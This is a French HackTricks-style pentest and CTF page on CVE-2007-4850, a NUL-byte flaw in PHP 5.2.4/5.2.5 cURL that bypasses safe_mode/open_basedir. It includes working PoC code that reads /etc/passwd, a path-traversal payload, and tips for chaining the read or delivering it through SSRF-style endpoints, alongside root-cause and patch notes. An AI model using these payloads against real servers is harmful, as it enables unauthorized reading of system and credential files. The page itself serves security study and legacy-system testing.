# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Cette page documente une astuce héritée mais encore utile dans les CTFs et les installations locales anciennes pour contourner les vérifications PHP safe_mode/open_basedir en utilisant l'extension cURL sur des builds PHP 5.2.x spécifiques.

- Affecté : PHP 5.2.4 et 5.2.5 avec ext/curl activé.
- Impact : Lecture de fichiers locaux arbitraires malgré les restrictions safe_mode ou open_basedir (pas d'exécution de code directe).
- ID : CVE-2007-4850.

Source : http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## PoC en une ligne

Si safe_mode ou open_basedir sont actifs et que cURL est activé, ce qui suit retournera le contenu du script courant :
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## PoC plus explicite (lecture arbitraire de fichiers)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Notes :
- Utilisez des guillemets doubles ou chr(0) pour injecter un véritable octet NUL. Le percent-encoding (%00) ne fonctionnera pas de manière fiable.
- Il s'agit d'une primitive de lecture de fichier. Combinez-la avec d'autres primitives (log poisoning, session file inclusion, etc.) pour une escalade supplémentaire quand c'est possible.

## Pourquoi cela fonctionne (bref)

La vulnérabilité réside dans la façon dont PHP 5.2.4/5.2.5 effectuait les vérifications safe_mode/open_basedir pour les URL file:// dans ext/curl. La vérification analysait l'URL et validait un composant de chemin, mais à cause du traitement des octets NUL elle validait une chaîne différente de celle réellement utilisée par libcurl. En pratique, le validateur pouvait approuver le chemin après le NUL tandis que libcurl utilisait la partie avant le NUL comme conteneur d'URL, permettant un contournement qui aboutit à la lecture du fichier placé après l'octet NUL. Voir l'analyse originale et le macro affecté dans curl/interface.c pour les détails. [CVE-2007-4850].

## Contraintes et corrections

- Corrigé dans les versions 5.2.x ultérieures (par ex. distro builds patchées en 5.2.6) en corrigeant l'analyse/validation dans ext/curl.
- N'affecte que des déploiements PHP très anciens ; safe_mode a été supprimé dans PHP 5.4 et les builds modernes n'exhibent pas ce comportement.

## Contournements historiques liés à cURL

- CVE-2006-2563 (PHP 4.4.2/5.1.4) : les wrappers libcurl autorisaient l'accès `file://` avec des NULs intégrés pour contourner open_basedir ; corrigé avant 5.2.x.
- Les bugs PHP #30609/#36223 ont suivi les premiers problèmes de cURL avec open_basedir utilisant `file://` sans canonicalisation. Toute vérification effectuée avant l'octet NUL ou sans résolution de type `realpath` est sujette à la même troncature.

## Astuces CTF

- Lorsque vous identifiez PHP 5.2.4/5.2.5 avec ext/curl chargé (cherchez `cURL support => enabled` dans `phpinfo()` et la `PHP Version` exacte), cette astuce fonctionne généralement même si `allow_url_fopen` est désactivé car ext/curl gère `file://` lui-même.
- Si les chemins directs sont bloqués, essayez un parcours relatif après le NUL, par ex. `file://x\x00../../../../etc/passwd`. Le parcours est résolu par libcurl, pas par la garde open_basedir.
- Vous pouvez emballer le payload dans un seul corps de requête HTTP pour déclencher le LFI via du code côté serveur vulnérable qui reflète des URLs contrôlées par l'utilisateur dans `curl_exec()` (commun dans les endpoints legacy de type SSRF).

## Voir aussi

D'autres contournements disable_functions/open_basedir et techniques modernes sont rassemblés ici :

{{#ref}}
README.md
{{#endref}}

## Références

- [Entrée CVE Ubuntu avec pointeurs de patch et versions affectées](https://ubuntu.com/security/CVE-2007-4850)
- [Analyse technique avec contexte de code (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [Bug PHP #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (problème d'octet NUL antérieur)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
